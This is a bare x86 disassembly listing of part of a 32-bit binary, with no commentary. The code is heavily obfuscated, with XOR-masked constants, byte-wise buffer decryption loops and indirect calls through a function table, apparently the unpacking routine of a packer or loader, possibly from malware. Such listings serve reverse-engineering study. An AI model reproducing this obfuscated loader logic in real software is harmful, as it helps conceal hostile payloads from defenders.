  424a92:	mov    eax,DWORD PTR [ebp-0x18]
  424a95:	mov    ecx,DWORD PTR [ebp-0x34]
  424a98:	xor    eax,ebx
  424a9a:	lea    eax,[eax+ecx*1+0x3272ec]
  424aa1:	mov    DWORD PTR [ebp-0x34],eax
  424aa4:	mov    eax,DWORD PTR [ebp-0x18]
  424aa7:	xor    eax,ebx
  424aa9:	mov    ecx,0xffcd8d14
  424aae:	sub    ecx,eax
  424ab0:	add    ecx,DWORD PTR [ebp-0x28]
  424ab3:	mov    eax,DWORD PTR [ebp-0x1c]
  424ab6:	cmp    eax,ecx
  424ab8:	jbe    0x42491d
  424abe:	mov    esi,edi
  424ac0:	mov    eax,DWORD PTR [ebp-0x34]
  424ac3:	mov    ecx,DWORD PTR [ebp-0x1c]
  424ac6:	cmp    ecx,eax
  424ac8:	jne    0x424adb
  424aca:	push   DWORD PTR [ebp+0x8]
  424acd:	lea    eax,[ebp-0x3c]
  424ad0:	push   eax
  424ad1:	call   0x427629
  424ad6:	mov    DWORD PTR [ebp-0x2c],eax
  424ad9:	jmp    0x424ae7
  424adb:	mov    eax,DWORD PTR [ebp-0x2c]
  424ade:	mov    ecx,DWORD PTR [ebp-0x18]
  424ae1:	xor    ecx,ebx
  424ae3:	add    ecx,esi
  424ae5:	xor    DWORD PTR [eax],ecx
  424ae7:	mov    eax,DWORD PTR [ebp-0x10]
  424aea:	mov    ecx,DWORD PTR [ebp-0x2c]
  424aed:	xor    eax,ebx
  424aef:	add    eax,esi
  424af1:	cmp    eax,ecx
  424af3:	je     0x42526d
  424af9:	mov    eax,DWORD PTR [ebp-0x10]
  424afc:	mov    ecx,DWORD PTR [ebp-0x3c]
  424aff:	xor    eax,ebx
  424b01:	add    eax,esi
  424b03:	cmp    eax,ecx
  424b05:	je     0x42526d
  424b0b:	mov    eax,DWORD PTR [ebp-0x10]
  424b0e:	xor    eax,ebx
  424b10:	add    eax,esi
  424b12:	jmp    0x424b30
  424b14:	mov    edi,DWORD PTR [ebp-0x2c]
  424b17:	mov    cl,al
  424b19:	and    cl,0x1f
  424b1c:	or     dl,0xff
  424b1f:	sub    dl,cl
  424b21:	add    BYTE PTR [edi+eax*1],dl
  424b24:	mov    ecx,DWORD PTR [ebp-0x18]
  424b27:	xor    ecx,ebx
  424b29:	lea    eax,[eax+ecx*1+0x3272ec]
  424b30:	mov    ecx,DWORD PTR [ebp-0x3c]
  424b33:	cmp    eax,ecx
  424b35:	jb     0x424b14
  424b37:	mov    eax,DWORD PTR [ebp-0x3c]
  424b3a:	mov    DWORD PTR [ebp-0x28],eax
  424b3d:	mov    eax,DWORD PTR [ebp-0x2c]
  424b40:	mov    DWORD PTR [ebp-0x34],0xf89c85b0
  424b47:	mov    DWORD PTR [ebp-0xd4],eax
  424b4d:	mov    edi,0xf89c85b1
  424b52:	mov    DWORD PTR [ebp-0x30],edi
  424b55:	mov    eax,DWORD PTR [ebp-0x34]
  424b58:	xor    eax,ebx
  424b5a:	add    eax,esi
  424b5c:	mov    DWORD PTR [ebp-0xc],eax
  424b5f:	mov    eax,DWORD PTR [ebp-0x34]
  424b62:	xor    eax,ebx
  424b64:	add    eax,esi
  424b66:	mov    DWORD PTR [ebp-0x8],eax
  424b69:	mov    DWORD PTR [ebp-0x44],0xf89c8590
  424b70:	mov    DWORD PTR [ebp-0x4c],0xf89c85bf
  424b77:	mov    eax,DWORD PTR [ebp-0x34]
  424b7a:	mov    ecx,DWORD PTR [ebp-0x28]
  424b7d:	xor    eax,ebx
  424b7f:	add    eax,esi
  424b81:	cmp    ecx,eax
  424b83:	je     0x424d82
  424b89:	jmp    0x424d5e
  424b8e:	mov    ecx,DWORD PTR [ebp-0xc]
  424b91:	mov    eax,DWORD PTR [ebp-0x28]
  424b94:	sub    eax,ecx
  424b96:	mov    ecx,DWORD PTR [ebp-0x44]
  424b99:	xor    ecx,ebx
  424b9b:	add    ecx,esi
  424b9d:	xor    edx,edx
  424b9f:	div    ecx
  424ba1:	mov    DWORD PTR [ebp-0x8],eax
  424ba4:	mov    eax,DWORD PTR [ebp-0x4c]
  424ba7:	mov    ecx,DWORD PTR [ebp-0x8]
  424baa:	xor    eax,ebx
  424bac:	add    eax,esi
  424bae:	cmp    ecx,eax
  424bb0:	jbe    0x424bbc
  424bb2:	mov    eax,DWORD PTR [ebp-0x4c]
  424bb5:	xor    eax,ebx
  424bb7:	add    eax,esi
  424bb9:	mov    DWORD PTR [ebp-0x8],eax
  424bbc:	mov    eax,DWORD PTR [ebp-0x44]
  424bbf:	mov    ecx,DWORD PTR [ebp-0x8]
  424bc2:	xor    eax,ebx
  424bc4:	add    eax,esi
  424bc6:	imul   eax,ecx
  424bc9:	mov    DWORD PTR [ebp-0x8],eax
  424bcc:	mov    eax,DWORD PTR [ebp-0x34]
  424bcf:	mov    ecx,DWORD PTR [ebp-0x8]
  424bd2:	xor    eax,ebx
  424bd4:	add    eax,esi
  424bd6:	cmp    ecx,eax
  424bd8:	je     0x424d4c
  424bde:	mov    eax,DWORD PTR [ebp-0x8]
  424be1:	mov    DWORD PTR [ebp-0x14],eax
  424be4:	mov    eax,DWORD PTR [ebp-0xc]
  424be7:	add    eax,DWORD PTR [ebp-0xd4]
  424bed:	mov    DWORD PTR [ebp-0x24],0xf89c85b0
  424bf4:	mov    DWORD PTR [ebp-0x20],edi
  424bf7:	mov    DWORD PTR [ebp-0xe8],0xf89c85b2
  424c01:	mov    DWORD PTR [ebp-0x8],eax
  424c04:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  424c0b:	mov    DWORD PTR [ebp-0x1c],edi
  424c0e:	mov    eax,DWORD PTR [ebp-0x24]
  424c11:	xor    eax,ebx
  424c13:	add    eax,esi
  424c15:	jmp    0x424d0b
  424c1a:	mov    DWORD PTR [ebp-0xe0],0xf89c85bb
  424c24:	mov    DWORD PTR [ebp-0xc4],0xf89c858e
  424c2e:	mov    eax,DWORD PTR [ebp-0x1c]
  424c31:	mov    ecx,DWORD PTR [ebp-0x48]
  424c34:	xor    eax,ebx
  424c36:	add    eax,esi
  424c38:	imul   eax,ecx
  424c3b:	mov    ecx,DWORD PTR [ebp-0x8]
  424c3e:	mov    al,BYTE PTR [eax+ecx*1]
  424c41:	mov    BYTE PTR [ebp-0x2],al
  424c44:	mov    eax,DWORD PTR [ebp-0x1c]
  424c47:	mov    ecx,DWORD PTR [ebp-0x48]
  424c4a:	xor    eax,ebx
  424c4c:	add    eax,esi
  424c4e:	imul   eax,ecx
  424c51:	mov    ecx,DWORD PTR [ebp-0xe8]
  424c57:	xor    ecx,ebx
  424c59:	add    eax,ecx
  424c5b:	mov    ecx,DWORD PTR [ebp-0x8]
  424c5e:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  424c66:	mov    ecx,DWORD PTR [ebp-0xe0]
  424c6c:	xor    ecx,ebx
  424c6e:	lea    eax,[ecx+eax*1+0x3272ec]
  424c75:	movzx  ecx,BYTE PTR [ebp-0x2]
  424c79:	xor    ecx,eax
  424c7b:	mov    BYTE PTR [ebp-0x2],cl
  424c7e:	mov    al,BYTE PTR [ebp-0x2]
  424c81:	mov    ecx,DWORD PTR [ebp-0x1c]
  424c84:	mov    edx,DWORD PTR [ebp-0x48]
  424c87:	xor    ecx,ebx
  424c89:	add    ecx,esi
  424c8b:	imul   ecx,edx
  424c8e:	mov    edx,DWORD PTR [ebp-0x8]
  424c91:	mov    BYTE PTR [ecx+edx*1],al
  424c94:	mov    eax,DWORD PTR [ebp-0x1c]
  424c97:	mov    ecx,DWORD PTR [ebp-0x48]
  424c9a:	xor    eax,ebx
  424c9c:	add    eax,esi
  424c9e:	imul   eax,ecx
  424ca1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ca4:	mov    al,BYTE PTR [eax+ecx*1]
  424ca7:	mov    BYTE PTR [ebp-0x2],al
  424caa:	mov    eax,DWORD PTR [ebp-0x1c]
  424cad:	mov    ecx,DWORD PTR [ebp-0x48]
  424cb0:	xor    eax,ebx
  424cb2:	add    eax,esi
  424cb4:	imul   eax,ecx
  424cb7:	mov    ecx,DWORD PTR [ebp-0x20]
  424cba:	xor    ecx,ebx
  424cbc:	add    eax,ecx
  424cbe:	mov    ecx,DWORD PTR [ebp-0x8]
  424cc1:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  424cc9:	mov    ecx,DWORD PTR [ebp-0xc4]
  424ccf:	xor    ecx,ebx
  424cd1:	lea    eax,[ecx+eax*1+0x3272ec]
  424cd8:	movzx  ecx,BYTE PTR [ebp-0x2]
  424cdc:	xor    ecx,eax
  424cde:	mov    BYTE PTR [ebp-0x2],cl
  424ce1:	mov    al,BYTE PTR [ebp-0x2]
  424ce4:	mov    ecx,DWORD PTR [ebp-0x1c]
  424ce7:	mov    edx,DWORD PTR [ebp-0x48]
  424cea:	xor    ecx,ebx
  424cec:	add    ecx,esi
  424cee:	imul   ecx,edx
  424cf1:	mov    edx,DWORD PTR [ebp-0x8]
  424cf4:	mov    BYTE PTR [ecx+edx*1],al
  424cf7:	mov    eax,DWORD PTR [ebp-0x38]
  424cfa:	mov    ecx,DWORD PTR [ebp-0x20]
  424cfd:	xor    eax,ebx
  424cff:	xor    ecx,ebx
  424d01:	add    eax,esi
  424d03:	add    ecx,esi
  424d05:	imul   eax,ecx
  424d08:	add    eax,DWORD PTR [ebp-0x48]
  424d0b:	mov    DWORD PTR [ebp-0x48],eax
  424d0e:	mov    eax,DWORD PTR [ebp-0x48]
  424d11:	mov    ecx,DWORD PTR [ebp-0x14]
  424d14:	cmp    ecx,eax
  424d16:	jb     0x424c1a
  424d1c:	mov    eax,DWORD PTR [ebp-0x20]
  424d1f:	mov    ecx,DWORD PTR [ebp-0x14]
  424d22:	xor    eax,ebx
  424d24:	add    eax,esi
  424d26:	imul   eax,ecx
  424d29:	mov    ecx,DWORD PTR [ebp-0x24]
  424d2c:	xor    ecx,ebx
  424d2e:	add    ecx,esi
  424d30:	or     eax,ecx
  424d32:	mov    ecx,DWORD PTR [ebp-0x30]
  424d35:	xor    ecx,ebx
  424d37:	add    eax,ecx
  424d39:	mov    ecx,DWORD PTR [ebp-0x30]
  424d3c:	xor    ecx,ebx
  424d3e:	add    eax,ecx
  424d40:	mov    ecx,DWORD PTR [ebp-0xc]
  424d43:	lea    eax,[eax+ecx*1+0x64e5d8]
  424d4a:	jmp    0x424d5b
  424d4c:	mov    eax,DWORD PTR [ebp-0x30]
  424d4f:	mov    ecx,DWORD PTR [ebp-0xc]
  424d52:	xor    eax,ebx
  424d54:	lea    eax,[eax+ecx*1+0x3272ec]
  424d5b:	mov    DWORD PTR [ebp-0xc],eax
  424d5e:	mov    eax,DWORD PTR [ebp-0x30]
  424d61:	xor    eax,ebx
  424d63:	mov    ecx,0xffcd8d14
  424d68:	sub    ecx,eax
  424d6a:	add    ecx,DWORD PTR [ebp-0x28]
  424d6d:	mov    eax,DWORD PTR [ebp-0x30]
  424d70:	mov    edx,DWORD PTR [ebp-0xc]
  424d73:	xor    eax,ebx
  424d75:	add    eax,esi
  424d77:	imul   eax,edx
  424d7a:	cmp    eax,ecx
  424d7c:	jbe    0x424b8e
  424d82:	mov    eax,DWORD PTR [ebp-0x10]
  424d85:	mov    ecx,DWORD PTR [ebp-0x3c]
  424d88:	mov    eax,DWORD PTR [ebp+0x8]
  424d8b:	mov    edx,DWORD PTR [ebp-0x54]
  424d8e:	mov    eax,DWORD PTR [eax+0x1d8]
  424d94:	xor    edx,ebx
  424d96:	add    edx,esi
  424d98:	push   edx
  424d99:	mov    edx,DWORD PTR [ebp-0x40]
  424d9c:	xor    edx,ebx
  424d9e:	add    edx,esi
  424da0:	push   edx
  424da1:	push   ecx
  424da2:	mov    DWORD PTR [ebp-0x38],ecx
  424da5:	mov    ecx,DWORD PTR [ebp-0x10]
  424da8:	xor    ecx,ebx
  424daa:	add    ecx,esi
  424dac:	push   ecx
  424dad:	call   DWORD PTR [eax+0x14]
  424db0:	mov    edi,eax
  424db2:	mov    eax,DWORD PTR [ebp-0x10]
  424db5:	xor    eax,ebx
  424db7:	add    eax,esi
  424db9:	cmp    eax,edi
  424dbb:	je     0x424e16
  424dbd:	mov    eax,DWORD PTR [ebp-0x10]
  424dc0:	jmp    0x424de3
  424dc2:	mov    ecx,DWORD PTR [ebp-0x2c]
  424dc5:	xor    eax,ebx
  424dc7:	mov    cl,BYTE PTR [ecx+eax*1+0x3272ec]
  424dce:	mov    BYTE PTR [eax+edi*1+0x3272ec],cl
  424dd5:	mov    ecx,DWORD PTR [ebp-0x18]
  424dd8:	xor    ecx,ebx
  424dda:	lea    eax,[ecx+eax*1+0x3272ec]
  424de1:	xor    eax,ebx
  424de3:	mov    ecx,DWORD PTR [ebp-0x3c]
  424de6:	sub    ecx,esi
  424de8:	xor    ecx,ebx
  424dea:	cmp    eax,ecx
  424dec:	jne    0x424dc2
  424dee:	mov    eax,DWORD PTR [ebp+0x8]
  424df1:	mov    ecx,DWORD PTR [ebp-0x50]
  424df4:	mov    eax,DWORD PTR [eax+0x1d8]
  424dfa:	xor    ecx,ebx
  424dfc:	add    ecx,esi
  424dfe:	push   ecx
  424dff:	mov    ecx,DWORD PTR [ebp-0x10]
  424e02:	xor    ecx,ebx
  424e04:	add    ecx,esi
  424e06:	push   ecx
  424e07:	push   DWORD PTR [ebp-0x2c]
  424e0a:	call   DWORD PTR [eax+0x18]
  424e0d:	mov    eax,DWORD PTR [ebp-0x38]
  424e10:	mov    DWORD PTR [ebp-0x2c],edi
  424e13:	mov    DWORD PTR [ebp-0x3c],eax
  424e16:	mov    eax,DWORD PTR [ebp-0x2c]
  424e19:	mov    DWORD PTR [ebp-0x14],eax
  424e1c:	mov    eax,DWORD PTR [ebp-0x18]
  424e1f:	mov    ecx,DWORD PTR [ebp-0x10]
  424e22:	xor    eax,ebx
  424e24:	add    eax,esi
  424e26:	mov    DWORD PTR [ebp-0x5c],0x3d222a22
  424e2d:	mov    DWORD PTR [ebp-0x58],0x37223f22
  424e34:	jmp    0x424e67
  424e36:	mov    edx,DWORD PTR [ebp-0x14]
  424e39:	mov    edi,ecx
  424e3b:	xor    edi,ebx
  424e3d:	mov    cl,BYTE PTR [ebp+edi*1+0x327290]
  424e44:	movsx  edx,BYTE PTR [edi+edx*1+0x3272ec]
  424e4c:	xor    cl,0x79
  424e4f:	sub    cl,0x3
  424e52:	movzx  ecx,cl
  424e55:	cmp    edx,ecx
  424e57:	jne    0x424e71
  424e59:	mov    ecx,DWORD PTR [ebp-0x18]
  424e5c:	xor    ecx,ebx
  424e5e:	lea    ecx,[ecx+edi*1+0x3272ec]
  424e65:	xor    ecx,ebx
  424e67:	cmp    ecx,0xf89c85b8
  424e6d:	jne    0x424e36
  424e6f:	jmp    0x424e78
  424e71:	mov    eax,DWORD PTR [ebp-0x10]
  424e74:	xor    eax,ebx
  424e76:	add    eax,esi
  424e78:	mov    ecx,DWORD PTR [ebp-0x10]
  424e7b:	xor    ecx,ebx
  424e7d:	add    ecx,esi
  424e7f:	cmp    ecx,eax
  424e81:	je     0x424ff7
  424e87:	mov    eax,DWORD PTR [ebp-0x14]
  424e8a:	mov    eax,DWORD PTR [eax+0x8]
  424e8d:	mov    DWORD PTR [ebp-0xc],0xf89c85b0
  424e94:	mov    DWORD PTR [ebp-0x40],0xf89cc327
  424e9b:	mov    DWORD PTR [ebp-0x44],0xf89cb5b0
  424ea2:	mov    DWORD PTR [ebp-0x24],0xf89c85bc
  424ea9:	mov    DWORD PTR [ebp-0x20],eax
  424eac:	mov    eax,DWORD PTR [ebp+0x8]
  424eaf:	mov    ecx,DWORD PTR [ebp-0x24]
  424eb2:	xor    ecx,ebx
  424eb4:	add    ecx,esi
  424eb6:	push   ecx
  424eb7:	mov    ecx,DWORD PTR [ebp-0x44]
  424eba:	mov    eax,DWORD PTR [eax+0x1d8]
  424ec0:	xor    ecx,ebx
  424ec2:	add    ecx,esi
  424ec4:	push   ecx
  424ec5:	mov    ecx,DWORD PTR [ebp-0x40]
  424ec8:	xor    ecx,ebx
  424eca:	add    ecx,esi
  424ecc:	push   ecx
  424ecd:	mov    ecx,DWORD PTR [ebp-0xc]
  424ed0:	xor    ecx,ebx
  424ed2:	add    ecx,esi
  424ed4:	push   ecx
  424ed5:	call   DWORD PTR [eax+0x14]
  424ed8:	mov    edi,eax
  424eda:	mov    eax,DWORD PTR [ebp+0x8]
  424edd:	mov    ecx,DWORD PTR [ebp-0x24]
  424ee0:	mov    eax,DWORD PTR [eax+0x1d8]
  424ee6:	xor    ecx,ebx
  424ee8:	add    ecx,esi
  424eea:	push   ecx
  424eeb:	mov    ecx,DWORD PTR [ebp-0x44]
  424eee:	xor    ecx,ebx
  424ef0:	add    ecx,esi
  424ef2:	push   ecx
  424ef3:	mov    ecx,DWORD PTR [ebp-0xc]
  424ef6:	push   DWORD PTR [ebp-0x20]
  424ef9:	xor    ecx,ebx
  424efb:	add    ecx,esi
  424efd:	push   ecx
  424efe:	call   DWORD PTR [eax+0x14]
  424f01:	mov    ecx,DWORD PTR [ebp-0xc]
  424f04:	xor    ecx,ebx
  424f06:	add    ecx,esi
  424f08:	mov    DWORD PTR [ebp-0x24],eax
  424f0b:	cmp    ecx,edi
  424f0d:	je     0x42529a
  424f13:	mov    ecx,DWORD PTR [ebp-0xc]
  424f16:	xor    ecx,ebx
  424f18:	add    ecx,esi
  424f1a:	cmp    ecx,eax
  424f1c:	je     0x42529a
  424f22:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  424f29:	mov    DWORD PTR [ebp-0x54],0xf89c85b2
  424f30:	mov    ecx,DWORD PTR [ebp-0x40]
  424f33:	xor    cl,0xa4
  424f36:	sub    cl,0x14
  424f39:	mov    BYTE PTR [edi],cl
  424f3b:	mov    ecx,DWORD PTR [ebp-0xc]
  424f3e:	xor    cl,0xa4
  424f41:	sub    cl,0x14
  424f44:	mov    BYTE PTR [edi+0x1],cl
  424f47:	mov    ecx,DWORD PTR [ebp-0x54]
  424f4a:	xor    cl,0xa4
  424f4d:	sub    cl,0x14
  424f50:	mov    BYTE PTR [edi+0x2],cl
  424f53:	and    DWORD PTR [ebp-0xc8],0x0
  424f5a:	and    DWORD PTR [ebp-0xdc],0x0
  424f61:	lea    ecx,[ebp-0xdc]
  424f67:	push   ecx
  424f68:	push   DWORD PTR [ebp-0x20]
  424f6b:	push   eax
  424f6c:	lea    eax,[ebp-0xc8]
  424f72:	push   eax
  424f73:	mov    eax,DWORD PTR [ebp-0x14]
  424f76:	push   DWORD PTR [eax+0xc]
  424f79:	mov    eax,DWORD PTR [ebp-0x2c]
  424f7c:	add    eax,0x10
  424f7f:	push   eax
  424f80:	push   edi
  424f81:	call   0x424225
  424f86:	mov    DWORD PTR [ebp-0x40],eax
  424f89:	mov    eax,DWORD PTR [ebp+0x8]
  424f8c:	mov    ecx,DWORD PTR [ebp-0x50]
  424f8f:	mov    eax,DWORD PTR [eax+0x1d8]
  424f95:	xor    ecx,ebx
  424f97:	add    ecx,esi
  424f99:	push   ecx
  424f9a:	mov    ecx,DWORD PTR [ebp-0xc]
  424f9d:	xor    ecx,ebx
  424f9f:	add    ecx,esi
  424fa1:	push   ecx
  424fa2:	push   edi
  424fa3:	call   DWORD PTR [eax+0x18]
  424fa6:	mov    eax,DWORD PTR [ebp-0x40]
  424fa9:	add    eax,0xffcd8d14
  424fae:	xor    eax,ebx
  424fb0:	cmp    eax,0xf89c85b0
  424fb5:	mov    eax,DWORD PTR [ebp+0x8]
  424fb8:	mov    eax,DWORD PTR [eax+0x1d8]
  424fbe:	mov    ecx,DWORD PTR [ebp-0x50]
  424fc1:	jne    0x424fe4
  424fc3:	xor    ecx,ebx
  424fc5:	add    ecx,esi
  424fc7:	push   ecx
  424fc8:	mov    ecx,DWORD PTR [ebp-0xc]
  424fcb:	xor    ecx,ebx
  424fcd:	add    ecx,esi
  424fcf:	push   ecx
  424fd0:	push   DWORD PTR [ebp-0x2c]
  424fd3:	call   DWORD PTR [eax+0x18]
  424fd6:	mov    eax,DWORD PTR [ebp-0x24]
  424fd9:	mov    DWORD PTR [ebp-0x2c],eax
  424fdc:	mov    eax,DWORD PTR [ebp-0x20]
  424fdf:	mov    DWORD PTR [ebp-0x3c],eax
  424fe2:	jmp    0x424ff7
  424fe4:	xor    ecx,ebx
  424fe6:	add    ecx,esi
  424fe8:	push   ecx
  424fe9:	mov    ecx,DWORD PTR [ebp-0xc]
  424fec:	xor    ecx,ebx
  424fee:	add    ecx,esi
  424ff0:	push   ecx
  424ff1:	push   DWORD PTR [ebp-0x24]
  424ff4:	call   DWORD PTR [eax+0x18]
  424ff7:	mov    eax,DWORD PTR [ebp-0x3c]
  424ffa:	mov    DWORD PTR [ebp-0x34],eax
  424ffd:	mov    eax,DWORD PTR [ebp-0x2c]
  425000:	mov    DWORD PTR [ebp-0x28],0xf89c85b0
  425007:	mov    DWORD PTR [ebp-0x40],eax
  42500a:	mov    edi,0xf89c85b1
  42500f:	mov    DWORD PTR [ebp-0x30],edi
  425012:	mov    eax,DWORD PTR [ebp-0x28]
  425015:	xor    eax,ebx
  425017:	add    eax,esi
  425019:	mov    DWORD PTR [ebp-0xc],eax
  42501c:	mov    eax,DWORD PTR [ebp-0x28]
  42501f:	xor    eax,ebx
  425021:	add    eax,esi
  425023:	mov    DWORD PTR [ebp-0x14],eax
  425026:	mov    DWORD PTR [ebp-0x44],0xf89c8590
  42502d:	mov    DWORD PTR [ebp-0x24],0xf89c85bf
  425034:	mov    eax,DWORD PTR [ebp-0x28]
  425037:	mov    ecx,DWORD PTR [ebp-0x34]
  42503a:	xor    eax,ebx
  42503c:	add    eax,esi
  42503e:	cmp    ecx,eax
  425040:	je     0x425236
  425046:	jmp    0x425212
  42504b:	mov    ecx,DWORD PTR [ebp-0xc]
  42504e:	mov    eax,DWORD PTR [ebp-0x34]
  425051:	sub    eax,ecx
  425053:	mov    ecx,DWORD PTR [ebp-0x44]
  425056:	xor    ecx,ebx
  425058:	add    ecx,esi
  42505a:	xor    edx,edx
  42505c:	div    ecx
  42505e:	mov    DWORD PTR [ebp-0x14],eax
  425061:	mov    eax,DWORD PTR [ebp-0x24]
  425064:	mov    ecx,DWORD PTR [ebp-0x14]
  425067:	xor    eax,ebx
  425069:	add    eax,esi
  42506b:	cmp    ecx,eax
  42506d:	jbe    0x425079
  42506f:	mov    eax,DWORD PTR [ebp-0x24]
  425072:	xor    eax,ebx
  425074:	add    eax,esi
  425076:	mov    DWORD PTR [ebp-0x14],eax
  425079:	mov    eax,DWORD PTR [ebp-0x44]
  42507c:	mov    ecx,DWORD PTR [ebp-0x14]
  42507f:	xor    eax,ebx
  425081:	add    eax,esi
  425083:	imul   eax,ecx
  425086:	mov    DWORD PTR [ebp-0x14],eax
  425089:	mov    eax,DWORD PTR [ebp-0x28]
  42508c:	mov    ecx,DWORD PTR [ebp-0x14]
  42508f:	xor    eax,ebx
  425091:	add    eax,esi
  425093:	cmp    ecx,eax
  425095:	je     0x425200
  42509b:	mov    eax,DWORD PTR [ebp-0x14]
  42509e:	mov    DWORD PTR [ebp-0x20],eax
  4250a1:	mov    eax,DWORD PTR [ebp-0xc]
  4250a4:	add    eax,DWORD PTR [ebp-0x40]
  4250a7:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  4250ae:	mov    DWORD PTR [ebp-0x14],edi
  4250b1:	mov    DWORD PTR [ebp-0x54],0xf89c85b2
  4250b8:	mov    DWORD PTR [ebp-0x1c],eax
  4250bb:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  4250c2:	mov    DWORD PTR [ebp-0x8],edi
  4250c5:	mov    eax,DWORD PTR [ebp-0x4c]
  4250c8:	xor    eax,ebx
  4250ca:	add    eax,esi
  4250cc:	jmp    0x4251bf
  4250d1:	mov    DWORD PTR [ebp-0xe4],0xf89c85bb
  4250db:	mov    DWORD PTR [ebp-0xd0],0xf89c858e
  4250e5:	mov    eax,DWORD PTR [ebp-0x8]
  4250e8:	mov    ecx,DWORD PTR [ebp-0x18]
  4250eb:	xor    eax,ebx
  4250ed:	add    eax,esi
  4250ef:	imul   eax,ecx
  4250f2:	mov    ecx,DWORD PTR [ebp-0x1c]
  4250f5:	mov    al,BYTE PTR [eax+ecx*1]
  4250f8:	mov    BYTE PTR [ebp-0x1],al
  4250fb:	mov    eax,DWORD PTR [ebp-0x8]
  4250fe:	mov    ecx,DWORD PTR [ebp-0x18]
  425101:	xor    eax,ebx
  425103:	add    eax,esi
  425105:	imul   eax,ecx
  425108:	mov    ecx,DWORD PTR [ebp-0x54]
  42510b:	xor    ecx,ebx
  42510d:	add    eax,ecx
  42510f:	mov    ecx,DWORD PTR [ebp-0x1c]
  425112:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  42511a:	mov    ecx,DWORD PTR [ebp-0xe4]
  425120:	xor    ecx,ebx
  425122:	lea    eax,[ecx+eax*1+0x3272ec]
  425129:	movzx  ecx,BYTE PTR [ebp-0x1]
  42512d:	xor    ecx,eax
  42512f:	mov    BYTE PTR [ebp-0x1],cl
  425132:	mov    al,BYTE PTR [ebp-0x1]
  425135:	mov    ecx,DWORD PTR [ebp-0x8]
  425138:	mov    edx,DWORD PTR [ebp-0x18]
  42513b:	xor    ecx,ebx
  42513d:	add    ecx,esi
  42513f:	imul   ecx,edx
  425142:	mov    edx,DWORD PTR [ebp-0x1c]
  425145:	mov    BYTE PTR [ecx+edx*1],al
  425148:	mov    eax,DWORD PTR [ebp-0x8]
  42514b:	mov    ecx,DWORD PTR [ebp-0x18]
  42514e:	xor    eax,ebx
  425150:	add    eax,esi
  425152:	imul   eax,ecx
  425155:	mov    ecx,DWORD PTR [ebp-0x1c]
  425158:	mov    al,BYTE PTR [eax+ecx*1]
  42515b:	mov    BYTE PTR [ebp-0x1],al
  42515e:	mov    eax,DWORD PTR [ebp-0x8]
  425161:	mov    ecx,DWORD PTR [ebp-0x18]
  425164:	xor    eax,ebx
  425166:	add    eax,esi
  425168:	imul   eax,ecx
  42516b:	mov    ecx,DWORD PTR [ebp-0x14]
  42516e:	xor    ecx,ebx
  425170:	add    eax,ecx
  425172:	mov    ecx,DWORD PTR [ebp-0x1c]
  425175:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  42517d:	mov    ecx,DWORD PTR [ebp-0xd0]
  425183:	xor    ecx,ebx
  425185:	lea    eax,[ecx+eax*1+0x3272ec]
  42518c:	movzx  ecx,BYTE PTR [ebp-0x1]
  425190:	xor    ecx,eax
  425192:	mov    BYTE PTR [ebp-0x1],cl
  425195:	mov    al,BYTE PTR [ebp-0x1]
  425198:	mov    ecx,DWORD PTR [ebp-0x8]
  42519b:	mov    edx,DWORD PTR [ebp-0x18]
  42519e:	xor    ecx,ebx
  4251a0:	add    ecx,esi
  4251a2:	imul   ecx,edx
  4251a5:	mov    edx,DWORD PTR [ebp-0x1c]
  4251a8:	mov    BYTE PTR [ecx+edx*1],al
  4251ab:	mov    eax,DWORD PTR [ebp-0x38]
  4251ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4251b1:	xor    eax,ebx
  4251b3:	xor    ecx,ebx
  4251b5:	add    eax,esi
  4251b7:	add    ecx,esi
  4251b9:	imul   eax,ecx
  4251bc:	add    eax,DWORD PTR [ebp-0x18]
  4251bf:	mov    DWORD PTR [ebp-0x18],eax
  4251c2:	mov    eax,DWORD PTR [ebp-0x18]
  4251c5:	mov    ecx,DWORD PTR [ebp-0x20]
  4251c8:	cmp    ecx,eax
  4251ca:	jb     0x4250d1
  4251d0:	mov    eax,DWORD PTR [ebp-0x14]
  4251d3:	mov    ecx,DWORD PTR [ebp-0x20]
  4251d6:	xor    eax,ebx
  4251d8:	add    eax,esi
  4251da:	imul   eax,ecx
  4251dd:	mov    ecx,DWORD PTR [ebp-0x4c]
  4251e0:	xor    ecx,ebx
  4251e2:	add    ecx,esi
  4251e4:	or     eax,ecx
  4251e6:	mov    ecx,DWORD PTR [ebp-0x30]
  4251e9:	xor    ecx,ebx
  4251eb:	add    eax,ecx
  4251ed:	mov    ecx,DWORD PTR [ebp-0x30]
  4251f0:	xor    ecx,ebx
  4251f2:	add    eax,ecx
  4251f4:	mov    ecx,DWORD PTR [ebp-0xc]
  4251f7:	lea    eax,[eax+ecx*1+0x64e5d8]
  4251fe:	jmp    0x42520f
  425200:	mov    eax,DWORD PTR [ebp-0x30]
  425203:	mov    ecx,DWORD PTR [ebp-0xc]
  425206:	xor    eax,ebx
  425208:	lea    eax,[eax+ecx*1+0x3272ec]
  42520f:	mov    DWORD PTR [ebp-0xc],eax
  425212:	mov    eax,DWORD PTR [ebp-0x30]
  425215:	xor    eax,ebx
  425217:	mov    ecx,0xffcd8d14
  42521c:	sub    ecx,eax
  42521e:	add    ecx,DWORD PTR [ebp-0x34]
  425221:	mov    eax,DWORD PTR [ebp-0x30]
  425224:	mov    edx,DWORD PTR [ebp-0xc]
  425227:	xor    eax,ebx
  425229:	add    eax,esi
  42522b:	imul   eax,edx
  42522e:	cmp    eax,ecx
  425230:	jbe    0x42504b
  425236:	push   DWORD PTR [ebp+0x8]
  425239:	mov    eax,DWORD PTR [ebp+0x8]
  42523c:	push   DWORD PTR [eax+0x1cc]
  425242:	lea    eax,[ebp-0xd8]
  425248:	push   eax
  425249:	mov    eax,DWORD PTR [ebp+0x8]
  42524c:	mov    eax,DWORD PTR [eax+0x1c4]
  425252:	push   DWORD PTR [eax]
  425254:	mov    eax,DWORD PTR [ebp+0x8]
  425257:	mov    eax,DWORD PTR [eax+0x1c0]
  42525d:	push   DWORD PTR [eax]
  42525f:	push   DWORD PTR [ebp-0x3c]
  425262:	push   DWORD PTR [ebp-0x2c]
  425265:	call   0x425cfc
